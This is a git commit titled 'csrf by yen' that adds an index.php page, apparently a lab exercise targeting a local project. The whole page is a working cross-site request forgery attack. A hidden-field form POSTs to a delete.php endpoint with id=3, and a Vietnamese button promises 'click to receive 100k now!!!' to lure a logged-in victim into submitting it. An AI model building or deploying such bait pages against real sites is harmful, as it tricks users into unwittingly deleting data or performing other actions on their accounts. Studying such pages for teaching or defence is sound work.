3ccfb55bd15edef29c4ba6db3dd5ec4a630984fd
ngocyen02 <ngocyentxrt021201@gmail.com>
2022-10-20 16:57:01 +0700

    csrf by yen

---
+++ index.php
@@ -0,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="./css/style.css">
+</head>
+<body>
+    <img src="./img/hack.jpg" alt="nhn" srcset=""> <br>
+    <form action="
+http://localhost/project/delete.php?id=3" method="POST">
+<input type="hidden"name="content" value="">
+   
+    <button type="submit"> Hãy click để nhận ngay 100k !!!</button>
+    </form>
+</body>
+
+</html>
